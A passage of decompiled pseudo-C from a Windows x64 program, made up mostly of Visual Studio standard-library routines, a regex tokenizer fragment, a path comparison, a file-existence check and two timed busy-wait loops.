    if ((0xfff < (ulonglong)((((longlong)param_1[2] - (longlong)plVar1) / 0x48) * 0x48)) &&
       (plVar2 = (longlong *)plVar1[-1],
       0x1f < (ulonglong)((longlong)plVar1 + (-8 - (longlong)plVar2)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(plVar2);
    *param_1 = (longlong *)0x0;
    param_1[1] = (longlong *)0x0;
    param_1[2] = (longlong *)0x0;
  }
  return;
}



void FUN_14000b6f8(void **param_1)

{
  void *pvVar1;
  void *_Memory;
  
  pvVar1 = *param_1;
  if (pvVar1 != (void *)0x0) {
    _Memory = pvVar1;
    if ((0xfff < (ulonglong)((((longlong)param_1[2] - (longlong)pvVar1) / 0x18) * 0x18)) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
    *param_1 = (void *)0x0;
    param_1[1] = (void *)0x0;
    param_1[2] = (void *)0x0;
  }
  return;
}



void FUN_14000b774(void **param_1)

{
  void *pvVar1;
  void *_Memory;
  
  if ((void *)0x7 < param_1[3]) {
    pvVar1 = *param_1;
    _Memory = pvVar1;
    if ((0xfff < (longlong)param_1[3] * 2 + 2U) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
  }
  param_1[3] = (void *)0x7;
  param_1[2] = (void *)0x0;
  *(undefined2 *)param_1 = 0;
  return;
}



void FUN_14000b7d8(char **param_1)

{
  char cVar1;
  char *pcVar2;
  ulonglong uVar3;
  bool bVar4;
  
  if (*param_1 == param_1[2]) {
    pcVar2 = (char *)0xffffffff;
    *(undefined *)(param_1 + 0xf) = 0xff;
    cVar1 = -1;
  }
  else {
    cVar1 = **param_1;
    *(char *)(param_1 + 0xf) = cVar1;
    pcVar2 = strchr("()$^.*+?[]|\\-{},:=!\n\r\b",(int)cVar1);
    cVar1 = *(char *)(param_1 + 0xf);
    if (pcVar2 != (char *)0x0) {
      pcVar2 = (char *)(ulonglong)(uint)(int)cVar1;
    }
  }
  *(int *)((longlong)param_1 + 0x7c) = (int)pcVar2;
  if (cVar1 < '@') {
    if (cVar1 != '?') {
      if (cVar1 == '\n') {
        if ((*(byte *)(param_1 + 0x10) & 4) == 0) {
          return;
        }
        if (*(int *)((longlong)param_1 + 0x1c) != 0) {
          return;
        }
        *(undefined4 *)((longlong)param_1 + 0x7c) = 0x7c;
        return;
      }
      if (cVar1 == '$') {
        if ((*(uint *)(param_1 + 0x10) & 0x2000000) == 0) {
          return;
        }
        if (*param_1 + 1 == param_1[2]) {
          return;
        }
        cVar1 = (*param_1)[1] + -10;
      }
      else {
        if ((cVar1 == '(') || (cVar1 == ')')) {
          bVar4 = (*(byte *)(param_1 + 0x10) & 8) == 0;
          goto LAB_14000b8e4;
        }
        if (cVar1 != '*') {
          if (cVar1 != '+') {
            return;
          }
          goto LAB_14000b846;
        }
        if ((*(uint *)(param_1 + 0x10) & 0x4000000) == 0) {
          return;
        }
        uVar3 = FUN_14000851c((longlong)(param_1 + 8));
        cVar1 = (char)uVar3;
      }
      if (cVar1 == '\0') {
        return;
      }
      goto LAB_14000b8e6;
    }
LAB_14000b846:
    bVar4 = (*(byte *)(param_1 + 0x10) & 1) == 0;
  }
  else {
    if (cVar1 == '\\') {
      cVar1 = FUN_14000a4c8((longlong *)param_1);
      if (cVar1 == '\0') {
        return;
      }
      cVar1 = (*param_1)[1];
      *(char *)(param_1 + 0xf) = cVar1;
      *(int *)((longlong)param_1 + 0x7c) = (int)cVar1;
      return;
    }
    if (cVar1 == '^') {
      if ((*(uint *)(param_1 + 0x10) & 0x2000000) == 0) {
        return;
      }
      uVar3 = FUN_14000851c((longlong)(param_1 + 8));
      bVar4 = (char)uVar3 == '\0';
    }
    else {
      if (cVar1 != '{') {
        if (cVar1 == '|') {
          bVar4 = (*(byte *)(param_1 + 0x10) & 2) == 0;
          goto LAB_14000b8e4;
        }
        if (cVar1 != '}') {
          return;
        }
      }
      bVar4 = (*(byte *)(param_1 + 0x10) & 0x10) == 0;
    }
  }
LAB_14000b8e4:
  if (!bVar4) {
    return;
  }
LAB_14000b8e6:
  *(undefined4 *)((longlong)param_1 + 0x7c) = 0;
  return;
}



void FUN_14000b924(longlong *param_1,ulonglong param_2)

{
  void *pvVar1;
  uint *puVar2;
  void *pvVar3;
  code *pcVar4;
  longlong lVar5;
  ulonglong uVar6;
  
  if (param_2 < 0x8000000000000000) {
    pvVar3 = (void *)param_1[1];
    uVar6 = param_2 + 0x1f >> 5;
    if ((uVar6 < (ulonglong)((longlong)pvVar3 - *param_1 >> 2)) &&
       (pvVar1 = (void *)(*param_1 + uVar6 * 4), pvVar1 != pvVar3)) {
      lVar5 = FUN_1400027c4(pvVar3,(longlong)pvVar3,pvVar1);
      param_1[1] = lVar5;
    }
    param_1[3] = param_2;
    if ((param_2 & 0x1f) != 0) {
      puVar2 = (uint *)(*param_1 + -4 + uVar6 * 4);
      *puVar2 = *puVar2 & (1 << ((byte)param_2 & 0x1f)) - 1U;
    }
    return;
  }
  FUN_14000ba4c();
  pcVar4 = (code *)swi(3);
  (*pcVar4)();
  return;
}



undefined8 FUN_14000b9ac(char **param_1)

{
  int *piVar1;
  int iVar2;
  code *pcVar3;
  ulonglong uVar4;
  undefined8 uVar5;
  byte bVar6;
  
  *(int *)((longlong)param_1 + 0x1c) = *(int *)((longlong)param_1 + 0x1c) + 1;
  piVar1 = (int *)((longlong)param_1 + 0x7c);
  if (((*(uint *)(param_1 + 0x10) >> 0x1b & 1) == 0) && (*piVar1 == 0x29)) {
    FUN_140009e2c(param_1,5);
    pcVar3 = (code *)swi(3);
    uVar5 = (*pcVar3)();
    return uVar5;
  }
  if (((*(uint *)(param_1 + 0x10) & 0x20) == 0) || (*piVar1 != 0x3f)) {
    if ((*(uint *)(param_1 + 0xe) & 0x200) == 0) {
      uVar5 = FUN_14000947c((longlong)param_1);
      goto LAB_14000ba25;
    }
  }
  else {
    FUN_14000ac88(param_1);
    iVar2 = *piVar1;
    FUN_14000ac88(param_1);
    if (iVar2 != 0x3a) {
      if (iVar2 == 0x21) {
        bVar6 = 1;
      }
      else {
        if (iVar2 != 0x3d) {
          FUN_140009e2c(param_1,0xe);
          pcVar3 = (code *)swi(3);
          uVar5 = (*pcVar3)();
          return uVar5;
        }
        bVar6 = 0;
      }
      uVar4 = FUN_140009438((longlong)param_1,bVar6);
      *(int *)((longlong)param_1 + 0x1c) = *(int *)((longlong)param_1 + 0x1c) + -1;
      return uVar4 & 0xffffffffffffff00;
    }
  }
  uVar5 = FUN_14000996c((longlong)param_1);
LAB_14000ba25:
  *(int *)((longlong)param_1 + 0x1c) = *(int *)((longlong)param_1 + 0x1c) + -1;
  return CONCAT71((int7)((ulonglong)uVar5 >> 8),1);
}



void FUN_14000ba4c(void)

{
  code *pcVar1;
  
  std::_Xlength_error("vector<bool> too long");
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void FUN_14000ba60(void)

{
  code *pcVar1;
  
  std::_Xlength_error("string too long");
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void FUN_14000ba74(void)

{
  code *pcVar1;
  
  std::_Xlength_error("vector too long");
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void FUN_14000ba88(void)

{
  code *pcVar1;
  
  std::_Xout_of_range("invalid string position");
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  public: class std::basic_string<char,struct std::char_traits<char>,class std::allocator<char>>&
// __ptr64 __cdecl std::basic_string<char,struct std::char_traits<char>,class
// std::allocator<char>>::append(char const * __ptr64 const,unsigned __int64) __ptr64
// 
// Library: Visual Studio 2017 Release

basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ * __thiscall
std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::append
          (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *this,
          char *param_1,__uint64 param_2)

{
  longlong lVar1;
  basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *pbVar2;
  
  lVar1 = *(longlong *)(this + 0x10);
  if ((ulonglong)(*(longlong *)(this + 0x18) - lVar1) < param_2) {
    this = (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *)
           FUN_1400039d8((void **)this,param_2,0,param_1,param_2);
  }
  else {
    *(__uint64 *)(this + 0x10) = lVar1 + param_2;
    pbVar2 = this;
    if (0xf < *(ulonglong *)(this + 0x18)) {
      pbVar2 = *(basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ **)
                this;
    }
    memmove(pbVar2 + lVar1,param_1,param_2);
    (pbVar2 + lVar1)[param_2] =
         (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___)0x0;
  }
  return this;
}



// Library Function - Single Match
//  public: class std::basic_string<char,struct std::char_traits<char>,class std::allocator<char>>&
// __ptr64 __cdecl std::basic_string<char,struct std::char_traits<char>,class
// std::allocator<char>>::append(unsigned __int64,char) __ptr64
// 
// Library: Visual Studio 2017 Release

basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ * __thiscall
std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::append
          (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *this,
          __uint64 param_1,char param_2)

{
  longlong lVar1;
  basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *pbVar2;
  
  lVar1 = *(longlong *)(this + 0x10);
  if ((ulonglong)(*(longlong *)(this + 0x18) - lVar1) < param_1) {
    this = (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *)
           FUN_140003dd8((void **)this,param_1,0,param_1,param_2);
  }
  else {
    *(__uint64 *)(this + 0x10) = lVar1 + param_1;
    pbVar2 = this;
    if (0xf < *(ulonglong *)(this + 0x18)) {
      pbVar2 = *(basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ **)
                this;
    }
    memset(pbVar2 + lVar1,(int)param_2,param_1);
    (pbVar2 + lVar1)[param_1] =
         (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___)0x0;
  }
  return this;
}



// Library Function - Multiple Matches With Different Base Names
//  public: class std::basic_string<unsigned short,struct std::char_traits<unsigned short>,class
// std::allocator<unsigned short>>& __ptr64 __cdecl std::basic_string<unsigned short,struct
// std::char_traits<unsigned short>,class std::allocator<unsigned short>>::append(unsigned short
// const * __ptr64 const,unsigned __int64) __ptr64
//  public: class std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class
// std::allocator<wchar_t>>& __ptr64 __cdecl std::basic_string<wchar_t,struct
// std::char_traits<wchar_t>,class std::allocator<wchar_t>>::append(wchar_t const * __ptr64
// const,unsigned __int64) __ptr64
// 
// Library: Visual Studio 2017 Release

void ** FID_conflict_append(void **param_1,void *param_2,ulonglong param_3)

{
  void *pvVar1;
  void **ppvVar2;
  
  pvVar1 = param_1[2];
  if ((ulonglong)((longlong)param_1[3] - (longlong)pvVar1) < param_3) {
    param_1 = FUN_1400035a0(param_1,param_3,param_3 & 0xffffffffffffff00,param_2,param_3);
  }
  else {
    param_1[2] = (void *)((longlong)pvVar1 + param_3);
    ppvVar2 = param_1;
    if ((void *)0x7 < param_1[3]) {
      ppvVar2 = (void **)*param_1;
    }
    memmove((void *)((longlong)ppvVar2 + (longlong)pvVar1 * 2),param_2,param_3 * 2);
    *(undefined2 *)((longlong)ppvVar2 + (longlong)(void *)((longlong)pvVar1 + param_3) * 2) = 0;
  }
  return param_1;
}



void ** FUN_14000bc0c(void **param_1,ulonglong param_2,ulonglong param_3)

{
  void *pvVar1;
  void *pvVar2;
  undefined2 *puVar3;
  void **ppvVar4;
  
  pvVar2 = param_1[2];
  if ((ulonglong)((longlong)param_1[3] - (longlong)pvVar2) < param_2) {
    param_1 = FUN_140003c50(param_1,param_2,param_3 & 0xffffffffffffff00,param_2,(short)param_3);
  }
  else {
    pvVar1 = (void *)((longlong)pvVar2 + param_2);
    param_1[2] = pvVar1;
    ppvVar4 = param_1;
    if ((void *)0x7 < param_1[3]) {
      ppvVar4 = (void **)*param_1;
    }
    puVar3 = (undefined2 *)((longlong)ppvVar4 + (longlong)pvVar2 * 2);
    if (param_2 != 0) {
      for (; param_2 != 0; param_2 = param_2 - 1) {
        *puVar3 = (short)param_3;
        puVar3 = puVar3 + 1;
      }
    }
    *(undefined2 *)((longlong)ppvVar4 + (longlong)pvVar1 * 2) = 0;
  }
  return param_1;
}



// Library Function - Multiple Matches With Different Base Names
//  public: class std::basic_string<unsigned short,struct std::char_traits<unsigned short>,class
// std::allocator<unsigned short>>& __ptr64 __cdecl std::basic_string<unsigned short,struct
// std::char_traits<unsigned short>,class std::allocator<unsigned short>>::assign(unsigned short
// const * __ptr64 const,unsigned __int64) __ptr64
//  public: class std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class
// std::allocator<wchar_t>>& __ptr64 __cdecl std::basic_string<wchar_t,struct
// std::char_traits<wchar_t>,class std::allocator<wchar_t>>::assign(wchar_t const * __ptr64
// const,unsigned __int64) __ptr64
// 
// Library: Visual Studio 2017 Release

void ** FID_conflict_assign(void **param_1,void *param_2,void *param_3)

{
  void **_Dst;
  
  if (param_3 < param_1[3] || param_3 == param_1[3]) {
    _Dst = param_1;
    if ((void *)0x7 < param_1[3]) {
      _Dst = (void **)*param_1;
    }
    param_1[2] = param_3;
    memmove(_Dst,param_2,(longlong)param_3 * 2);
    *(undefined2 *)((longlong)param_3 * 2 + (longlong)_Dst) = 0;
  }
  else {
    param_1 = FUN_140003350(param_1,param_3,(ulonglong)param_3 & 0xffffffffffffff00,param_2);
  }
  return param_1;
}



int FUN_14000bcf0(undefined8 *param_1,ushort **param_2)

{
  ushort *puVar1;
  ushort *puVar2;
  ushort uVar3;
  int iVar4;
  ushort *puVar5;
  ushort *puVar6;
  ulonglong uVar7;
  ushort *puVar8;
  undefined8 *puVar9;
  longlong lVar10;
  ulonglong uVar11;
  ushort *puVar12;
  byte bVar13;
  ulonglong uVar14;
  
  puVar9 = param_1;
  if (7 < (ulonglong)param_1[3]) {
    puVar9 = (undefined8 *)*param_1;
  }
  puVar1 = (ushort *)((longlong)puVar9 + param_1[2] * 2);
  puVar5 = (ushort *)FUN_140009e54((short *)puVar9,(short *)puVar1);
  puVar8 = *param_2;
  puVar2 = puVar8 + (longlong)param_2[1];
  puVar6 = (ushort *)FUN_140009e54((short *)puVar8,(short *)puVar2);
  uVar11 = (longlong)puVar6 - (longlong)puVar8 >> 1;
  uVar14 = (longlong)puVar5 - (longlong)puVar9 >> 1;
  uVar7 = uVar14;
  if (uVar11 < uVar14) {
    uVar7 = uVar11;
  }
  if (uVar7 != 0) {
    lVar10 = (longlong)puVar9 - (longlong)puVar8;
    do {
      uVar3 = *(ushort *)(lVar10 + (longlong)puVar8);
      if (uVar3 != *puVar8) {
        return (-(uint)(uVar3 < *puVar8) & 0xfffffffe) + 1;
      }
      puVar8 = puVar8 + 1;
      uVar7 = uVar7 - 1;
    } while (uVar7 != 0);
  }
  if (uVar14 < uVar11) {
    iVar4 = -1;
  }
  else {
    puVar8 = puVar5;
    if (uVar11 < uVar14) {
      iVar4 = 1;
    }
    else {
      for (; (puVar12 = puVar6, puVar8 != puVar1 && ((*puVar8 == 0x5c || (*puVar8 == 0x2f))));
          puVar8 = puVar8 + 1) {
      }
      for (; (puVar12 != puVar2 && ((*puVar12 == 0x5c || (*puVar12 == 0x2f))));
          puVar12 = puVar12 + 1) {
      }
      iVar4 = (uint)(puVar5 != puVar8) - (uint)(puVar6 != puVar12);
      if (iVar4 == 0) {
        do {
          while( true ) {
            iVar4 = (uint)(puVar12 == puVar2) - (uint)(puVar8 == puVar1);
            if (puVar8 == puVar1) {
              return iVar4;
            }
            if (iVar4 != 0) {
              return iVar4;
            }
            if ((*puVar8 == 0x5c) || (*puVar8 == 0x2f)) {
              bVar13 = 1;
            }
            else {
              bVar13 = 0;
            }
            if ((*puVar12 == 0x5c) || (*puVar12 == 0x2f)) {
              iVar4 = 1;
            }
            else {
              iVar4 = 0;
            }
            if (iVar4 - (uint)bVar13 != 0) {
              return iVar4 - (uint)bVar13;
            }
            if (bVar13 != 0) break;
            if ((uint)*puVar8 - (uint)*puVar12 != 0) {
              return (uint)*puVar8 - (uint)*puVar12;
            }
            puVar8 = puVar8 + 1;
            puVar12 = puVar12 + 1;
          }
          do {
            puVar8 = puVar8 + 1;
            if (puVar8 == puVar1) break;
          } while ((*puVar8 == 0x5c) || (*puVar8 == 0x2f));
          do {
            puVar12 = puVar12 + 1;
            if (puVar12 == puVar2) break;
          } while ((*puVar12 == 0x5c) || (*puVar12 == 0x2f));
        } while( true );
      }
    }
  }
  return iVar4;
}



// Library Function - Multiple Matches With Same Base Name
//  public: void __cdecl std::allocator<struct `protected: int __cdecl GSI1::readHash(unsigned
// short,long,long) __ptr64'::`2'::FileSymbolInfo>::deallocate(struct `protected: int __cdecl
// GSI1::readHash(unsigned short,long,long) __ptr64'::`2'::FileSymbolInfo * __ptr64 const,unsigned
// __int64) __ptr64
//  public: void __cdecl std::allocator<struct GSISymbolEntry>::deallocate(struct GSISymbolEntry *
// __ptr64 const,unsigned __int64) __ptr64
// 
// Library: Visual Studio 2019 Release

void deallocate(undefined8 param_1,void *param_2,longlong param_3)

{
  void *_Memory;
  
  _Memory = param_2;
  if ((0xfff < (ulonglong)(param_3 * 0x18)) &&
     (_Memory = *(void **)((longlong)param_2 + -8),
     0x1f < (ulonglong)((longlong)param_2 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
    _invalid_parameter_noinfo_noreturn();
  }
  free(_Memory);
  return;
}



int * FUN_14000bf74(undefined8 param_1,int *param_2,int param_3)

{
  int iVar1;
  undefined **ppuVar2;
  
  if (param_3 == 0) {
    *param_2 = 0;
  }
  else {
    iVar1 = std::_Winerror_map(param_3);
    if (iVar1 == 0) {
      *param_2 = param_3;
      ppuVar2 = FUN_140002eb0();
      goto LAB_14000bfa9;
    }
    *param_2 = iVar1;
  }
  ppuVar2 = FUN_140002ea8();
LAB_14000bfa9:
  *(undefined ***)(param_2 + 2) = ppuVar2;
  return param_2;
}



undefined4 * FUN_14000bfbc(undefined8 param_1,undefined4 *param_2,undefined4 param_3)

{
  *param_2 = param_3;
  *(undefined8 *)(param_2 + 2) = param_1;
  return param_2;
}



// Library Function - Multiple Matches With Same Base Name
//  protected: virtual int __cdecl std::collate<char>::do_compare(char const * __ptr64,char const *
// __ptr64,char const * __ptr64,char const * __ptr64)const __ptr64
//  protected: virtual int __cdecl std::collate<unsigned short>::do_compare(unsigned short const *
// __ptr64,unsigned short const * __ptr64,unsigned short const * __ptr64,unsigned short const *
// __ptr64)const __ptr64
//  protected: virtual int __cdecl std::collate<wchar_t>::do_compare(wchar_t const * __ptr64,wchar_t
// const * __ptr64,wchar_t const * __ptr64,wchar_t const * __ptr64)const __ptr64
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

ulonglong do_compare(longlong param_1,char *param_2,char *param_3,char *param_4,char *param_5)

{
  int iVar1;
  ulonglong uVar2;
  
  iVar1 = _Strcoll(param_2,param_3,param_4,param_5,(_Collvec *)(param_1 + 0x10));
  uVar2 = (ulonglong)(iVar1 != 0);
  if (iVar1 < 0) {
    uVar2 = 0xffffffff;
  }
  return uVar2;
}



ulonglong FUN_14000c00c(undefined8 param_1,longlong param_2,longlong param_3)

{
  byte *pbVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  
  uVar3 = 0;
  uVar2 = 0xcbf29ce484222325;
  if (param_3 != param_2) {
    do {
      pbVar1 = (byte *)(uVar3 + param_2);
      uVar3 = uVar3 + 1;
      uVar2 = (uVar2 ^ *pbVar1) * 0x100000001b3;
    } while (uVar3 < (ulonglong)(param_3 - param_2));
  }
  return uVar2;
}



undefined (*) [16]
FUN_14000c01c(longlong param_1,undefined (*param_2) [16],char *param_3,char *param_4)

{
  ulonglong uVar1;
  ulonglong uVar2;
  undefined (*pauVar3) [16];
  undefined (*_String1) [16];
  
  *param_2 = ZEXT816(0);
  *(undefined8 *)param_2[1] = 0;
  *(undefined8 *)param_2[1] = 0;
  *(undefined8 *)(param_2[1] + 8) = 0xf;
  (*param_2)[0] = 0;
  uVar1 = (longlong)param_4 - (longlong)param_3;
  uVar2 = 0;
  if (uVar1 != 0) {
    uVar2 = 0;
    do {
      if (uVar2 < uVar1) {
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::append
                  ((basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *)
                   param_2,uVar1 - uVar2,'\0');
      }
      else {
        pauVar3 = param_2;
        if (0xf < *(ulonglong *)(param_2[1] + 8)) {
          pauVar3 = *(undefined (**) [16])*param_2;
        }
        *(ulonglong *)param_2[1] = uVar1;
        (*pauVar3)[uVar1] = 0;
      }
      pauVar3 = param_2;
      if (0xf < *(ulonglong *)(param_2[1] + 8)) {
        pauVar3 = *(undefined (**) [16])*param_2;
      }
      _String1 = param_2;
      if (0xf < *(ulonglong *)(param_2[1] + 8)) {
        _String1 = *(undefined (**) [16])*param_2;
      }
      uVar1 = _Strxfrm((char *)_String1,*pauVar3 + *(longlong *)param_2[1],param_3,param_4,
                       (_Collvec *)(param_1 + 0x10));
      uVar2 = *(ulonglong *)param_2[1];
      if (uVar1 <= uVar2) goto LAB_14000c0ea;
    } while (uVar1 != 0);
  }
  if (uVar2 < uVar1) {
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::append
              ((basic_string_char_struct_std__char_traits_char__class_std__allocator_char___ *)
               param_2,uVar1 - uVar2,'\0');
  }
  else {
LAB_14000c0ea:
    pauVar3 = param_2;
    if (0xf < *(ulonglong *)(param_2[1] + 8)) {
      pauVar3 = *(undefined (**) [16])*param_2;
    }
    *(ulonglong *)param_2[1] = uVar1;
    (*pauVar3)[uVar1] = 0;
  }
  return param_2;
}



longlong * FUN_14000c12c(undefined8 *param_1,longlong *param_2)

{
  ulonglong *puVar1;
  longlong lVar2;
  ulonglong uVar3;
  undefined4 local_18;
  undefined4 uStack20;
  
  puVar1 = (ulonglong *)(param_2 + 1);
  lVar2 = param_1[3];
  local_18 = (undefined4)*param_1;
  uStack20 = (undefined4)((ulonglong)*param_1 >> 0x20);
  *(undefined4 *)param_2 = local_18;
  *(undefined4 *)((longlong)param_2 + 4) = uStack20;
  *(undefined4 *)(param_2 + 1) = 0;
  *(undefined4 *)((longlong)param_2 + 0xc) = 0;
  if ((lVar2 < 0) && (*puVar1 < (ulonglong)-lVar2)) {
    uVar3 = lVar2 + *puVar1;
    lVar2 = (~uVar3 >> 5) * -4 + -4;
  }
  else {
    uVar3 = lVar2 + *puVar1;
    lVar2 = (uVar3 >> 5) << 2;
  }
  *param_2 = *param_2 + lVar2;
  *puVar1 = uVar3;
  *puVar1 = (ulonglong)((uint)uVar3 & 0x1f);
  return param_2;
}



longlong FUN_14000c1a0(longlong param_1,int *param_2,int param_3)

{
  uint7 uVar1;
  
  uVar1 = (uint7)((ulonglong)*(longlong *)(param_2 + 2) >> 8);
  if ((*(longlong *)(param_1 + 8) == *(longlong *)(*(longlong *)(param_2 + 2) + 8)) &&
     (*param_2 == param_3)) {
    return CONCAT71(uVar1,1);
  }
  return (ulonglong)uVar1 << 8;
}



longlong FUN_14000c1bc(longlong *param_1,undefined4 param_2,int *param_3)

{
  int *piVar1;
  uint7 uVar3;
  longlong lVar2;
  undefined local_18 [16];
  
  piVar1 = (int *)(**(code **)(*param_1 + 0x18))(param_1,local_18,param_2);
  uVar3 = (uint7)((ulonglong)piVar1 >> 8);
  if ((*(longlong *)(*(longlong *)(piVar1 + 2) + 8) == *(longlong *)(*(longlong *)(param_3 + 2) + 8)
      ) && (*piVar1 == *param_3)) {
    lVar2 = CONCAT71(uVar3,1);
  }
  else {
    lVar2 = (ulonglong)uVar3 << 8;
  }
  return lVar2;
}



// WARNING: Could not reconcile some variable overlaps

longlong * FUN_14000c1f8(uint **param_1,longlong *param_2,longlong *param_3,uint **param_4)

{
  ulonglong *puVar1;
  longlong lVar2;
  uint *puVar3;
  longlong *plVar4;
  ulonglong uVar5;
  longlong lVar6;
  uint *puVar7;
  uint *local_68;
  ulonglong uStack96;
  undefined8 local_58;
  uint *puStack80;
  undefined4 local_48;
  undefined4 uStack68;
  undefined4 uStack64;
  undefined4 uStack60;
  longlong local_38 [2];
  undefined4 local_28 [4];
  
  puVar3 = *param_1;
  if (param_1[3] == (uint *)0x0) {
    local_58 = *param_4;
    puStack80 = param_4[1];
    uVar5 = 0;
    uStack96 = 0;
    local_68 = puVar3;
    puVar7 = puVar3;
  }
  else {
    uVar5 = (*param_3 - (longlong)puVar3 >> 2) * 0x20 + param_3[1];
    if (((longlong)uVar5 < 0) && (uVar5 != 0)) {
      lVar6 = -((~uVar5 >> 5) * 4 + 4);
    }
    else {
      lVar6 = (uVar5 >> 5) * 4;
    }
    local_58 = *param_4;
    puStack80 = param_4[1];
    uStack96 = (ulonglong)((uint)uVar5 & 0x1f);
    puVar7 = puStack80 + ((longlong)local_58 - (longlong)puVar3 >> 2) * 8;
    if (((longlong)puVar7 < 0) && (puVar7 != (uint *)0x0)) {
      lVar2 = -((~(ulonglong)puVar7 >> 5) * 4 + 4);
    }
    else {
      lVar2 = ((ulonglong)puVar7 >> 5) * 4;
    }
    uVar5 = (ulonglong)((uint)puVar7 & 0x1f);
    local_68 = (uint *)((longlong)puVar3 + lVar6);
    puVar7 = (uint *)((longlong)puVar3 + lVar2);
  }
  lVar6 = ((longlong)local_68 - (longlong)puVar3 >> 2) * 0x20 + uStack96;
  if ((local_68 != puVar7) || (uStack96 != uVar5)) {
    plVar4 = FUN_14000c12c(param_1,local_38);
    local_48 = *(undefined4 *)plVar4;
    uStack68 = *(undefined4 *)((longlong)plVar4 + 4);
    uStack64 = *(undefined4 *)(plVar4 + 1);
    uStack60 = *(undefined4 *)((longlong)plVar4 + 0xc);
    local_58 = puVar7;
    puStack80 = (uint *)uVar5;
    plVar4 = (longlong *)FUN_140002890(local_28,(uint **)&local_58,(uint **)&local_48,&local_68);
    FUN_14000b924((longlong *)param_1,(*plVar4 - (longlong)*param_1 >> 2) * 0x20 + plVar4[1]);
  }
  local_58._0_4_ = SUB84(*param_1,0);
  local_58._4_4_ = (undefined4)((ulonglong)*param_1 >> 0x20);
  *(undefined4 *)param_2 = (undefined4)local_58;
  *(undefined4 *)((longlong)param_2 + 4) = local_58._4_4_;
  *(undefined4 *)(param_2 + 1) = 0;
  *(undefined4 *)((longlong)param_2 + 0xc) = 0;
  puVar1 = (ulonglong *)(param_2 + 1);
  if ((lVar6 < 0) && (*puVar1 < (ulonglong)-lVar6)) {
    uVar5 = *puVar1 + lVar6;
    lVar6 = (~uVar5 >> 5) * -4 + -4;
  }
  else {
    uVar5 = *puVar1 + lVar6;
    lVar6 = (uVar5 >> 5) << 2;
  }
  *param_2 = *param_2 + lVar6;
  *puVar1 = uVar5;
  *puVar1 = (ulonglong)((uint)uVar5 & 0x1f);
  return param_2;
}



ulonglong FUN_14000c3ec(void **param_1)

{
  code *pcVar1;
  int *piVar2;
  ulonglong uVar3;
  undefined8 local_res10 [3];
  int local_18 [2];
  undefined **local_10;
  
  uVar3 = 0;
  local_18[0] = 0;
  local_10 = FUN_140002eb0();
  piVar2 = (int *)FUN_14000cdd0(local_res10,param_1,local_18);
  if (*piVar2 == 0) {
    if (local_18[0] != 0) {
      FUN_14000b494("exists",local_18,param_1);
      pcVar1 = (code *)swi(3);
      uVar3 = (*pcVar1)();
      return uVar3;
    }
  }
  else {
    uVar3 = (ulonglong)(*piVar2 != 1);
  }
  return (ulonglong)piVar2 & 0xffffffffffffff00 | uVar3;
}



void FUN_14000c450(void)

{
  longlong lVar1;
  longlong lVar2;
  longlong lVar3;
  
  lVar1 = _Query_perf_frequency();
  lVar2 = _Query_perf_counter();
  if (lVar1 == 10000000) {
    lVar2 = lVar2 * 100;
  }
  else {
    lVar2 = ((lVar2 % lVar1) * 1000000000) / lVar1 + (lVar2 / lVar1) * 1000000000;
  }
  do {
    lVar1 = _Query_perf_frequency();
    lVar3 = _Query_perf_counter();
    if (lVar1 == 10000000) {
      lVar3 = lVar3 * 100;
    }
    else {
      lVar3 = ((lVar3 % lVar1) * 1000000000) / lVar1 + (lVar3 / lVar1) * 1000000000;
    }
  } while (lVar3 < lVar2 + 5000000000);
  return;
}



void FUN_14000c4ec(void)

{
  longlong lVar1;
  longlong lVar2;
  longlong lVar3;
  
  lVar1 = _Query_perf_frequency();
  lVar2 = _Query_perf_counter();
  if (lVar1 == 10000000) {
    lVar2 = lVar2 * 100;
  }
  else {
    lVar2 = ((lVar2 % lVar1) * 1000000000) / lVar1 + (lVar2 / lVar1) * 1000000000;
  }
  do {
    lVar1 = _Query_perf_frequency();
    lVar3 = _Query_perf_counter();
    if (lVar1 == 10000000) {
      lVar3 = lVar3 * 100;
    }
    else {
      lVar3 = ((lVar3 % lVar1) * 1000000000) / lVar1 + (lVar3 / lVar1) * 1000000000;
    }
  } while (lVar3 < lVar2 + 120000000000);
  return;
}



ulonglong FUN_14000c588(undefined8 *param_1)

{
  longlong lVar1;
  uint uVar2;
  uint7 uVar4;
  undefined8 *puVar3;
  undefined8 *puVar5;
  longlong lVar6;
  
  puVar5 = param_1;
  if (7 < (ulonglong)param_1[3]) {
    puVar5 = (undefined8 *)*param_1;
  }
  lVar1 = param_1[2];
